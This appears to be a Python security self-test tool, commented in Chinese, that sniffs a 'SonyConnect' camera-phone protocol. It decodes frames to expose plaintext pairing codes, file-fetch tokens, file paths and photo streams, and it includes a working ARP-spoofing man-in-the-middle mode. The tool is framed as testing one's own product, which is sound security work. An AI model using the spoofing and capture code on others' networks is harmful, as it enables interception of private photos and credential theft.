#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SonyConnect 明文链路自检抓包器（同网段视角）

用途：验证"去掉加密之后，同网段的人能看到什么"。它把 SonyConnect 自己的协议
（PTP/IP 帧 + 厂商操作码）解出来，重点标出**配对码、文件名、照片内容**这三类
在链路上一览无遗的东西。

★ 授权边界：只在你自己的相机/手机和你自己的网络上跑。这是给自己产品做的授权
  安全自测 —— 抓到的是你自己的照片和你自己相机的配对码。拿它去抓别人的设备或
  别人的网络是另一回事（那是未授权访问）。

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
先读这一节：为什么"同网段"不等于"看得到"
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
相机与手机之间的 Wi-Fi 是 WPA2 加密的，而且每个客户端各有一把密钥。所以：

  · 被动嗅探（本脚本默认模式）：只有**你就在路径上**时才看得到内容 ——
      1) 你是 AP：相机用「Wi-Fi 客户端模式」加入你开的热点，手机也加入同一个热点
         （Windows「移动热点」就够）→ 你在 AP 上抓，一切明文可见。**推荐，不需要攻击**。
      2) 交换机镜像口 / 支持监听模式且能解 WPA2 的网卡（Wi-Fi 上通常做不到）。
  · 不在路径上时什么都抓不到 —— 这不是脚本的问题，是 WPA2 按客户端加密的结果。
  · 同网段但要看到内容，就得把自己插进路径：`--arp-spoof`（ARP 欺骗 + 转发）。
    这是**主动**干扰，只在自己的网络上用，且必须有 IP 转发，否则会把相机那条
    链路搞断（脚本会警告）。

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
依赖
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  pip install scapy
  Windows 另需 Npcap（安装时勾 "WinPcap API-compatible Mode"）
  Linux 需要 root

用法
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  python sonyconnect_sniff.py --list                     # 列出网卡
  python sonyconnect_sniff.py --selftest                 # 不抓包，自检解析器
  sudo python sonyconnect_sniff.py -i wlan0              # 被动抓（先试这个）
  sudo python sonyconnect_sniff.py -i wlan0 --dump-dir cap/    # 顺手把文件流落盘
  sudo python sonyconnect_sniff.py -i wlan0 --arp-spoof 192.168.49.1 192.168.49.2
"""

import argparse
import os
import struct
import sys
import time

# ============================================================
# 协议常量 —— 与相机端 PtpCodec.java / 手机端 PtpCodec.kt 逐字对齐
# ============================================================

T_INIT_CMD_REQ = 0x0001
T_INIT_CMD_ACK = 0x0002
T_INIT_EVENT_REQ = 0x0003
T_INIT_EVENT_ACK = 0x0004
T_INIT_FAIL = 0x0005
T_OPERATION_REQ = 0x0006
T_OPERATION_RSP = 0x0007
T_EVENT = 0x0008
T_START_DATA = 0x0009
T_DATA = 0x000A
T_END_DATA = 0x000B
T_CANCEL = 0x000C
T_PROBE_REQ = 0x000D
T_PROBE_RESP = 0x000E
T_DATA_OPEN = 0x0040
T_DATA_OPEN_ACK = 0x0041

T_NAME = {
    T_INIT_CMD_REQ: "Init Cmd Req",
    T_INIT_CMD_ACK: "Init Cmd Ack",
    T_INIT_EVENT_REQ: "Init Event Req",
    T_INIT_EVENT_ACK: "Init Event Ack",
    T_INIT_FAIL: "Init Fail",
    T_OPERATION_REQ: "Operation Req",
    T_OPERATION_RSP: "Operation Rsp",
    T_EVENT: "Event",
    T_START_DATA: "Start Data",
    T_DATA: "Data",
    T_END_DATA: "End Data",
    T_CANCEL: "Cancel",
    T_PROBE_REQ: "Probe Req",
    T_PROBE_RESP: "Probe Rsp",
    T_DATA_OPEN: "DATA_OPEN",
    T_DATA_OPEN_ACK: "DATA_OPEN_ACK",
}

OP_NAME = {
    0x9001: "PAIR_BEGIN",
    0x9002: "PAIR_EXCHANGE",
    0x9004: "PAIR_ABORT",
    0x9005: "PAIR_REMOVE",
    0x9012: "PING",
    0x9013: "DEVICE_INFO",
    0x9020: "LIST_DIR",
    0x9021: "STAT",
    0x9022: "GET_OBJECT",
    0x9023: "THUMB_QUEUE_BEGIN",
    0x9024: "THUMB_QUEUE_PAUSE",
    0x9025: "THUMB_QUEUE_RESUME",
    0x9026: "THUMB_QUEUE_CANCEL",
    0x9030: "EXIT_APP",
}

RC_NAME = {
    0x2001: "OK",
    0x2002: "GENERAL_ERROR",
    0x2003: "SESSION_NOT_OPEN",
    0x2004: "INVALID_TX",
    0x2005: "NOT_SUPPORTED",
    0x2006: "ACCESS_DENIED",
    0x2007: "NOT_FOUND",
    0x2008: "DEVICE_BUSY",
    0x2009: "PAIRING_FAILED",
    0x200B: "CANCELED",
}

FAIL_NAME = {
    0x01: "REJECTED",
    0x02: "UNSUPPORTED",
    0x03: "BUSY",
    0x04: "NOT_PAIRED",
}

KIND_NAME = {0: "THUMB(160x120)", 1: "PREVIEW(1616x1080)", 2: "ORIGINAL(原图)"}
EV_NAME = {0x9041: "EV_THUMB_PROGRESS"}
VENDOR_TAG = "SonyConnect/2.0"

# 协议端口候选 15740/15741/25740/25741；文件端口 = 协议端口 +1..+16
DEFAULT_BPF = (
    "(tcp portrange 15740-15760 or tcp portrange 25740-25760 "
    "or udp portrange 15740-15760 or udp portrange 25740-25760)"
)

MAX_PAYLOAD_KEEP = 512 * 1024   # 落盘只留前 512 KiB，够证明"明文照片"即可


# ============================================================
# 小工具
# ============================================================

def u8(b, o):
    return b[o] if o < len(b) else 0


def u16(b, o):
    return struct.unpack_from("<H", b, o)[0] if o + 2 <= len(b) else 0


def u32(b, o):
    return struct.unpack_from("<I", b, o)[0] if o + 4 <= len(b) else 0


def i64(b, o):
    return struct.unpack_from("<q", b, o)[0] if o + 8 <= len(b) else 0


def read_name(b, off):
    """友好名：u8 字符数 + UTF-16LE 字符。返回 (名字, 下一偏移)。"""
    chars = u8(b, off)
    if off + 1 + chars * 2 > len(b):
        return "", min(off + 1, len(b))
    raw = b[off + 1:off + 1 + chars * 2]
    try:
        return raw.decode("utf-16-le", "replace"), off + 1 + chars * 2
    except Exception:
        return "", off + 1


def hexid(b, n=8):
    return b[:n].hex()


def text_of(blob, limit=200):
    if not blob:
        return ""
    try:
        s = blob.decode("utf-8")
        if all(ord(c) > 31 or c in "\r\n\t" for c in s):
            return s if len(s) <= limit else s[:limit] + "…"
    except Exception:
        pass
    return blob[:32].hex() + ("…" if len(blob) > 32 else "")


def file_magic(b):
    if len(b) >= 3 and b[0:3] == b"\xff\xd8\xff":
        return "JPEG（明文照片流）"
    if b[0:4] in (b"II*\x00", b"MM\x00*"):
        return "TIFF/ARW（明文原始照片流）"
    if b[0:8] == b"\x89PNG\r\n\x1a\n":
        return "PNG（明文图片流）"
    if b[0:4] == b"RIFF":
        return "RIFF（明文媒体流）"
    return ""


def parse_op_body(body):
    """
    操作包体两种形态（与 PtpCodec 一致）：
      DP_NONE(0)   ：DataPhase(4)|Code(2)|TxId(4)|Params(4×n)
      DP_DATA_IN(1)：DataPhase(4)|Code(2)|TxId(4)|ParamCount(4)|Params|BlobLen(4)|Blob
    返回 (dataPhase, code, txId, params, blob)；解析不了返回 None。
    """
    if len(body) < 10:
        return None
    dp = u32(body, 0)
    code = u16(body, 4)
    tx = u32(body, 6)
    if dp == 1:
        if len(body) < 18:
            return None
        n = u32(body, 10)
        if 14 + n * 4 + 4 > len(body):
            return None
        params = [u32(body, 14 + i * 4) for i in range(n)]
        bl = u32(body, 14 + n * 4)
        start = 18 + n * 4
        blob = body[start:start + bl] if 0 < bl <= len(body) - start else b""
        return dp, code, tx, params, blob
    n = (len(body) - 10) // 4
    params = [u32(body, 10 + i * 4) for i in range(n)]
    return dp, code, tx, params, b""


def protover_text(pv):
    return "%d.%d" % (pv >> 16, pv & 0xFFFF)


# ============================================================
# 泄露清单
# ============================================================

class Findings:
    def __init__(self):
        self.camera = set()
        self.phone = set()
        self.codes = []
        self.paths = []
        self.files = []
        self.tokens = 0
        self.conns = 0

    def report(self):
        out = []
        if self.camera:
            out.append("  相机： " + "；".join(sorted(self.camera)))
        if self.phone:
            out.append("  手机： " + "；".join(sorted(self.phone)))
        if self.codes:
            out.append("  ★ 配对码（明文，%d 次）： %s" % (len(self.codes), ", ".join(self.codes)))
        if self.paths:
            uniq = sorted(set(self.paths))
            shown = ", ".join(uniq[:8]) + ("…" if len(uniq) > 8 else "")
            out.append("  浏览到的文件/目录（%d 个）： %s" % (len(uniq), shown))
        if self.tokens:
            out.append("  一次性取件令牌： %d 个（明文可见，用完即废）" % self.tokens)
        if self.files:
            out.append("  明文文件流： " + "；".join(self.files))
        return "\n".join(out)


FINDINGS = Findings()


# ============================================================
# TCP 流重组 + 帧切分
# ============================================================

class Flow:
    """一条 TCP 方向上的按序重组，再切成 PTP/IP 帧。"""

    def __init__(self):
        self.buf = bytearray()
        self.next_seq = None
        self.file_payload = bytearray()
        self.file_total = -1
        self.file_dumped = False
        self.warned_gap = False

    def feed(self, seq, payload):
        if not payload:
            return
        if self.next_seq is None:
            self.next_seq = seq
        if seq < self.next_seq:
            skip = self.next_seq - seq
            if skip >= len(payload):
                return                       # 纯重传
            payload = payload[skip:]
            seq = self.next_seq
        elif seq > self.next_seq:
            # 中间丢包：这条流的内容不再可信，清空重来（不影响别的流）
            self.buf.clear()
            if not self.warned_gap:
                print("    [!] 丢包/乱序：本条流后续内容可能不完整")
                self.warned_gap = True
            self.next_seq = seq
        self.buf += payload
        self.next_seq = seq + len(payload)

    def frames(self):
        """切出完整帧。长度或类型不对就按一字节重新对齐（防误判靠类型白名单）。"""
        while len(self.buf) >= 8:
            ln = u32(self.buf, 0)
            typ = u32(self.buf, 4)
            if ln < 8 or ln > 4 * 1024 * 1024 or typ not in T_NAME:
                del self.buf[:1]
                continue
            if len(self.buf) < ln:
                return
            body = bytes(self.buf[8:ln])
            del self.buf[:ln]
            yield typ, body


# ============================================================
# 解析器
# ============================================================

class Dissector:
    def __init__(self, dump_dir=None):
        self.flows = {}
        self.dump_dir = dump_dir
        # 请求/响应要按"连接 + 事务号"配对：响应包的 code 字段是 RC，
        # 不看请求就不知道它答的是哪个操作。
        self.pending = {}
        self.known_conns = set()
        if dump_dir:
            os.makedirs(dump_dir, exist_ok=True)

    # ---------- 入口 ----------

    def on_packet(self, pkt):
        ts = time.time()
        try:
            from scapy.all import Raw, TCP, UDP
            if pkt.haslayer(UDP):
                self._udp(pkt)
            elif pkt.haslayer(TCP) and pkt.haslayer(Raw):
                self._tcp(pkt[TCP], bytes(pkt[Raw].load), pkt["IP"].src, pkt["IP"].dst)
        except Exception as e:
            print("    [!] 抓包回调异常: %s" % e)

    def _conn_id(self, src, sport, dst, dport):
        a = (src, sport)
        b = (dst, dport)
        return tuple(sorted([a, b]))

    def _tcp(self, t, payload, src, dst):
        key = (src, int(t.sport), dst, int(t.dport))
        conn = self._conn_id(src, int(t.sport), dst, int(t.dport))
        fl = self.flows.get(key)
        if fl is None:
            fl = Flow()
            self.flows[key] = fl
            if conn not in self.known_conns:
                self.known_conns.add(conn)
                FINDINGS.conns += 1
                print("\n[新连接 #%d] %s:%d ↔ %s:%d" % (FINDINGS.conns, src, int(t.sport),
                                                   dst, int(t.dport)))
        fl.feed(int(t.seq), payload)
        for typ, body in fl.frames():
            self._frame(conn, key, typ, body, fl)

    def _udp(self, pkt):
        from scapy.all import Raw, UDP
        u = pkt[UDP]
        if not pkt.haslayer(Raw):
            return
        raw = bytes(pkt[Raw].load)
        if len(raw) < 8:
            return
        typ = u32(raw, 4)
        if typ not in (T_PROBE_REQ, T_PROBE_RESP):
            return
        print("\n[UDP 发现] %s:%d → %s:%d" % (pkt["IP"].src, int(u.sport),
                                          pkt["IP"].dst, int(u.dport)))
        self._frame(None, None, typ, raw[8:], None)

    # ---------- 单帧 ----------

    def _frame(self, conn, key, typ, body, fl):
        try:
            self._dispatch(conn, key, typ, body, fl)
        except Exception as e:            # 畸形包不能让抓包器崩掉
            print("    [!] 解析 %s 失败: %s" % (T_NAME.get(typ, hex(typ)), e))

    def _dispatch(self, conn, key, typ, body, fl):
        name = T_NAME.get(typ, hex(typ))

        if typ == T_INIT_CMD_REQ:
            guid = body[:16]
            dname, nxt = read_name(body, 16)
            print("    → %s  手机 deviceId=%s  名字=%r  协议=%s"
                  % (name, hexid(guid), dname, protover_text(u32(body, nxt))))
            FINDINGS.phone.add("%s（deviceId %s）" % (dname, hexid(guid)))
            return

        if typ == T_INIT_CMD_ACK:
            guid = body[4:20]
            cname, nxt = read_name(body, 20)
            print("    ← %s  connNo=%d  相机 GUID=%s  名字=%r  协议=%s"
                  % (name, u32(body, 0), guid.hex(), cname, protover_text(u32(body, nxt))))
            FINDINGS.camera.add("%s（GUID %s）" % (cname, guid.hex()))
            return

        if typ == T_INIT_FAIL:
            print("    ← %s  原因=%s（0x%02X）"
                  % (name, FAIL_NAME.get(u32(body, 0), "?"), u32(body, 0)))
            return

        if typ in (T_INIT_EVENT_REQ, T_INIT_EVENT_ACK):
            print("    %s connNo=%d" % (name, u32(body, 0)))
            return

        if typ in (T_PROBE_REQ, T_PROBE_RESP):
            pname, nxt = read_name(body, 16)
            line = "    %s  相机 GUID=%s  名字=%r" % (name, body[:16].hex(), pname)
            if typ == T_PROBE_RESP and nxt + 8 <= len(body):
                line += "  协议端口=%d 文件端口=%d 配对模式=%s 已有配对=%s" % (
                    u16(body, nxt), u16(body, nxt + 2),
                    "是" if u8(body, nxt + 4) else "否",
                    "是" if u8(body, nxt + 5) else "否")
                FINDINGS.camera.add("%s（GUID %s）" % (pname, body[:16].hex()))
            print(line)
            return

        if typ in (T_OPERATION_REQ, T_OPERATION_RSP):
            parsed = parse_op_body(body)
            if parsed is None:
                print("    %s（载荷过短，跳过）" % name)
                return
            _, code, tx, params, blob = parsed
            is_req = (typ == T_OPERATION_REQ)
            if is_req:
                op = code
                self.pending[(conn, tx)] = op
                label = OP_NAME.get(op, "0x%04X" % op)
                print("    → Operation Req  tx=0x%X  op=%s" % (tx, label))
                self._op_req(op, params, blob)
            else:
                op = self.pending.pop((conn, tx), None)
                opname = OP_NAME.get(op, "0x%04X" % op) if op is not None else "?"
                print("    ← Operation Rsp  tx=0x%X  rc=%s（答 %s）"
                      % (tx, RC_NAME.get(code, "0x%04X" % code), opname))
                self._op_rsp(op, code, params, blob)
            return

        if typ == T_EVENT:
            ev = u16(body, 0)
            n = max(0, (len(body) - 6) // 4)
            print("    ← Event %s tx=0x%X params=%s"
                  % (EV_NAME.get(ev, hex(ev)), u32(body, 2),
                     [u32(body, 6 + i * 4) for i in range(n)]))
            return

        if typ == T_DATA_OPEN:
            FINDINGS.tokens += 1
            print("    → DATA_OPEN  手机 deviceId=%s  connNo=%d  令牌=0x%X"
                  "（明文取件凭据）" % (hexid(body), u32(body, 16), i64(body, 20)))
            return

        if typ == T_DATA_OPEN_ACK:
            print("    ← DATA_OPEN_ACK")
            return

        if typ == T_START_DATA:
            if fl is not None:
                fl.file_total = i64(body, 4)
                fl.file_payload = bytearray()
            print("    ← Start Data  本次将发送 %d 字节" % i64(body, 4))
            return

        if typ == T_DATA:
            if fl is not None and len(fl.file_payload) < MAX_PAYLOAD_KEEP:
                room = MAX_PAYLOAD_KEEP - len(fl.file_payload)
                fl.file_payload += body[4:4 + room]
            return

        if typ == T_END_DATA:
            if fl is not None:
                fl.file_payload += body[4:]
                got = len(fl.file_payload)
                magic = file_magic(bytes(fl.file_payload[:64]))
                tail = ""
                if fl.file_total > 0:
                    tail = "（声明 %d，%s）" % (
                        fl.file_total,
                        "一致" if got == fl.file_total else "实收 %d：抓包可能丢了包" % got)
                print("    ← End Data  明文接收 %d 字节%s%s"
                      % (got, ("，" + magic) if magic else "", tail))
                if magic:
                    FINDINGS.files.append("%s %d 字节" % (magic, got))
                self._maybe_dump(fl)
            return

        if typ == T_CANCEL:
            print("    ← Cancel")
            return

        print("    %s（%d 字节载荷）" % (name, len(body)))

    # ---------- 操作明细 ----------

    def _op_req(self, op, params, blob):
        if op == 0x9001:          # PAIR_BEGIN
            print("        手机设备名 = %r（相机端配对页显示的就是这个）" % text_of(blob))
        elif op == 0x9002:        # PAIR_EXCHANGE
            s = text_of(blob)
            print("        ★★★ 配对码 = %s   ← 明文过网，同一网段直接可见" % s)
            if s.isdigit():
                FINDINGS.codes.append(s)
        elif op in (0x9020, 0x9021):
            path = text_of(blob)
            print("        路径 = %s" % path)
            if path:
                FINDINGS.paths.append(path)
        elif op == 0x9022:        # GET_OBJECT
            kind = params[0] if params else -1
            off = ((params[1] & 0xFFFFFFFF) | ((params[2] & 0xFFFFFFFF) << 32)
                   if len(params) > 2 else 0)
            ln = params[3] if len(params) > 3 else -1
            to_end = ln < 0 or ln == 0xFFFFFFFF
            path = text_of(blob)
            print("        %s 路径 = %s" % (KIND_NAME.get(kind, "kind=%d" % kind), path))
            print("        起点 = %d  长度 = %s" % (off, "到末尾" if to_end else ln))
            if path:
                FINDINGS.paths.append(path)
        elif op in (0x9023, 0x9024, 0x9025, 0x9026):
            items = [x for x in text_of(blob, 4000).split("\n") if x]
            print("        缩略图队列 %d 项，前几个：%s" % (len(items), ", ".join(items[:3])))
            FINDINGS.paths.extend(items[:200])
        elif op == 0x9005:
            print("        解除配对")
        elif op == 0x9030:
            print("        请求相机退出")

    def _op_rsp(self, op, rc, params, blob):
        if op == 0x9001:          # PAIR_BEGIN 应答：相机设备码
            print("        相机设备码 = %s" % text_of(blob))
        elif op == 0x9002:        # PAIR_EXCHANGE 应答
            print("        相机判定 = %s" % ("通过（配对码正确）" if rc == 0x2001 else "拒绝"))
        elif op == 0x9022:        # GET_OBJECT 应答：一次性令牌 + 文件端口
            if len(params) >= 2:
                print("        一次性令牌 = 0x%X  文件端口 = %d（明文，可被抢用）"
                      % (params[0] & 0xFFFFFFFF, params[1]))
        elif op == 0x9012:        # PING 应答
            print("        电量 = %d%%  镜头 = %r"
                  % (params[0] if params else -1, text_of(blob)))
        elif op == 0x9013:        # DEVICE_INFO 应答
            print("        设备信息 = %s" % text_of(blob, 400))
        elif op == 0x9021 and len(params) >= 4:
            size = (params[0] & 0xFFFFFFFF) | ((params[1] & 0xFFFFFFFF) << 32)
            print("        大小 = %d 字节" % size)

    def _maybe_dump(self, fl):
        if not self.dump_dir or fl.file_dumped or not fl.file_payload:
            return
        fl.file_dumped = True
        data = bytes(fl.file_payload)
        ext = ".bin"
        if data[:3] == b"\xff\xd8\xff":
            ext = ".jpg"
        elif data[:4] in (b"II*\x00", b"MM\x00*"):
            ext = ".arw"
        elif data[:8] == b"\x89PNG\r\n\x1a\n":
            ext = ".png"
        path = os.path.join(self.dump_dir, "stream-%d%s" % (int(time.time() * 1000) % 1000000, ext))
        with open(path, "wb") as f:
            f.write(data)
        print("        ↓ 已落盘明文文件：%s（%d 字节）" % (path, len(data)))


# ============================================================
# ARP 欺骗（同网段把自己插进路径）
# ============================================================

def arp_spoof_loop(iface, victims, stop_evt):
    """持续告诉两台设备"对方在我这儿"。必须配合 IP 转发，否则会切断链路。"""
    from scapy.all import ARP, getmacbyip, send
    macs = {}
    for ip in victims:
        mac = getmacbyip(ip)
        if not mac:
            print("[!] 拿不到 %s 的 MAC，这一台跳过" % ip)
            continue
        macs[ip] = mac
        print("    ARP 目标 %s → %s" % (ip, mac))
    if len(macs) < 2:
        print("[!] 目标不足两台，双向路径建不起来")
        return
    ips = list(macs.keys())
    while not stop_evt.is_set():
        for ip in ips:
            for other in ips:
                if other != ip:
                    send(ARP(op=2, pdst=ip, hwdst=macs[ip], psrc=other),
                         iface=iface, verbose=False)
        stop_evt.wait(1.5)


def arp_restore(iface, victims):
    """尽力还原对端的 ARP 表，别把网络留在半路。"""
    from scapy.all import ARP, getmacbyip, send
    if len(victims) < 2:
        return
    a, b = victims[0], victims[1]
    for ip, other in ((a, b), (b, a)):
        mac = getmacbyip(ip)
        omac = getmacbyip(other)
        if mac and omac:
            send(ARP(op=2, pdst=ip, hwdst=mac, psrc=other, hwsrc=omac),
                 iface=iface, count=3, verbose=False)


# ============================================================
# 自检：不用抓包，直接把合成帧喂给解析器
# ============================================================

def selftest():
    def frame(typ, body):
        return struct.pack("<II", 8 + len(body), typ) + body

    def opblob(typ, code, tx, blob):
        b = (struct.pack("<IHI", 1, code, tx) + struct.pack("<I", 0)
             + struct.pack("<I", len(blob)) + blob)
        return frame(typ, b)

    def opblob_params(typ, code, tx, params, blob):
        b = (struct.pack("<IHI", 1, code, tx) + struct.pack("<I", len(params))
             + b"".join(struct.pack("<I", p & 0xFFFFFFFF) for p in params)
             + struct.pack("<I", len(blob)) + blob)
        return frame(typ, b)

    def op_plain(typ, code, tx, params):
        b = struct.pack("<IHI", 0, code, tx) + b"".join(
            struct.pack("<I", p & 0xFFFFFFFF) for p in params)
        return frame(typ, b)

    def nm(s):
        return struct.pack("<B", len(s)) + s.encode("utf-16-le")

    guid_phone = bytes(range(0x51, 0x61))
    guid_cam = bytes(range(0xA0, 0xB0))
    jpeg = b"\xff\xd8\xff\xe0\x00\x10JFIF" + bytes(200)

    stream = b"".join([
        # 发现应答（UDP 内容，直接喂给解析器）
        frame(T_PROBE_RESP, guid_cam + nm("ILCE-6300 SonyConnect/2.0")
              + struct.pack("<HHBBH", 15740, 15741, 1, 0, 0)),
        # 控制连接：Init 握手 → 配对两步 → PING → 列目录
        frame(T_INIT_CMD_REQ, guid_phone + nm("Xiaomi 15") + struct.pack("<I", 1 << 16)),
        frame(T_INIT_CMD_ACK, struct.pack("<I", 7) + guid_cam
              + nm("ILCE-6300 05186914") + struct.pack("<I", 1 << 16)),
        opblob(T_OPERATION_REQ, 0x9001, 0x41, "Xiaomi 15".encode("utf-8")),
        opblob(T_OPERATION_RSP, 0x2001, 0x41, guid_cam[:8]),
        opblob(T_OPERATION_REQ, 0x9002, 0x42, b"483920"),
        opblob(T_OPERATION_RSP, 0x2001, 0x42, b""),
        op_plain(T_OPERATION_REQ, 0x9012, 3, []),
        op_plain(T_OPERATION_RSP, 0x2001, 3, [77, 1]),
        opblob(T_OPERATION_REQ, 0x9020, 4, b"/DCIM/100MSDCF"),
        opblob(T_OPERATION_RSP, 0x2001, 4, b'{"dir":true,"entries":[]}'),
        opblob_params(T_OPERATION_REQ, 0x9022, 5, [2, 0, 0, -1],
                      b"/DCIM/100MSDCF/DSC00001.ARW"),
        op_plain(T_OPERATION_RSP, 0x2001, 5, [0x9ABCDEF0, 15741]),
        # 文件端口：一次完整的明文取件
        frame(T_DATA_OPEN, guid_phone + struct.pack("<I", 7) + struct.pack("<q", 0x1122334455)),
        frame(T_DATA_OPEN_ACK, b""),
        frame(T_START_DATA, struct.pack("<I", 1) + struct.pack("<q", len(jpeg))),
        frame(T_DATA, struct.pack("<I", 1) + jpeg[:100]),
        frame(T_END_DATA, struct.pack("<I", 1) + jpeg[100:]),
    ])

    print("=== 自检：把合成帧流按 7 字节一段喂进去（模拟真实抓包切分）===")
    d = Dissector(dump_dir=None)
    conn = ("10.0.0.2", 40000, "10.0.0.1", 15740)
    key = ("10.0.0.2", 40000, "10.0.0.1", 15740)
    fl = Flow()
    step = 7
    for i in range(0, len(stream), step):
        fl.feed(i, stream[i:i + step])
        for typ, body in fl.frames():
            d._frame(conn, key, typ, body, fl)

    print()
    print("=== 泄露清单（自检）===")
    rep = FINDINGS.report()
    print(rep if rep else "  （什么都没识别到）")
    ok = (FINDINGS.codes == ["483920"] and FINDINGS.files and FINDINGS.paths
          and FINDINGS.tokens == 1)
    print()
    print("自检结果：", "通过" if ok else "失败（解析有问题）")
    return 0 if ok else 1


# ============================================================
# 主程序
# ============================================================

def main():
    ap = argparse.ArgumentParser(
        description="SonyConnect 明文链路自检抓包器（只用于自己的设备与网络）",
        formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("-i", "--iface", help="抓包网卡（用 --list 查看）")
    ap.add_argument("--list", action="store_true", help="列出网卡后退出")
    ap.add_argument("--selftest", action="store_true", help="不抓包，自检解析器")
    ap.add_argument("--bpf", default=DEFAULT_BPF, help="自定义抓包过滤器")
    ap.add_argument("--dump-dir", help="把明文文件流落盘到该目录（自测取证用）")
    ap.add_argument("--arp-spoof", nargs=2, metavar=("IP1", "IP2"),
                    help="★主动干扰★ 对这两台设备做 ARP 欺骗把自己插进路径"
                         "（需 IP 转发，否则链路会断；只在自己的网络上用）")
    ap.add_argument("-t", "--time", type=float, default=0, help="抓多少秒后退出（0=一直抓）")
    args = ap.parse_args()

    if args.selftest:
        return selftest()

    try:
        from scapy.all import AsyncSniffer, conf, get_if_list
    except ImportError:
        print("需要 scapy：pip install scapy")
        print("（Windows 还要装 Npcap，安装时勾 WinPcap API-compatible Mode）")
        return 2

    if args.list:
        print("可用网卡：")
        for i, n in enumerate(get_if_list()):
            print("  [%d] %s" % (i, n))
        print("\n默认网卡：%s" % conf.iface)
        return 0

    print("SonyConnect 明文链路自检抓包器")
    print("提示：被动模式只有在你就是 AP / 镜像口 / 监听模式时才看得到内容。")
    print("      Wi-Fi 是 WPA2 且每客户端一把密钥，不在路径上就什么也抓不到。")
    print()

    if args.arp_spoof:
        print("!! ARP 欺骗：你会成为相机与手机之间的中间人（主动干扰）。")
        print("!! 必须已开 IP 转发：")
        print("!!   Linux   : sysctl -w net.ipv4.ip_forward=1")
        print("!!   Windows : netsh interface ipv4 set interface <idx> forwarding=enabled")
        print("!!   否则相机那条链路会直接断掉。只在自己的网络上用。")
        print()

    d = Dissector(dump_dir=args.dump_dir)
    sniffer = AsyncSniffer(iface=args.iface, filter=args.bpf,
                           prn=d.on_packet, store=False)
    stop = None
    if args.arp_spoof:
        import threading
        stop = threading.Event()
        threading.Thread(target=arp_spoof_loop,
                         args=(args.iface, args.arp_spoof, stop), daemon=True).start()

    sniffer.start()
    print("[*] 开始抓包（Ctrl-C 结束）…")
    t0 = time.time()
    idled = False
    try:
        while True:
            time.sleep(0.5)
            if args.time and time.time() - t0 >= args.time:
                break
            if not idled and not d.flows and time.time() - t0 > 8:
                idled = True
                print("    [还没抓到包] 先确认自己在不在链路路径上：最省事的做法是让相机用"
                      "「Wi-Fi 客户端模式」加入你开的热点（你就是 AP）；"
                      "同网段则要用 --arp-spoof。")
    except KeyboardInterrupt:
        pass
    finally:
        try:
            sniffer.stop()
        except Exception:
            pass
        if stop:
            stop.set()
        if args.arp_spoof:
            arp_restore(args.iface, args.arp_spoof)

    print()
    print("=== 泄露清单（同网段能看到的东西）===")
    rep = FINDINGS.report()
    print(rep if rep else "  （什么都没抓到）")
    return 0


if __name__ == "__main__":
    sys.exit(main())
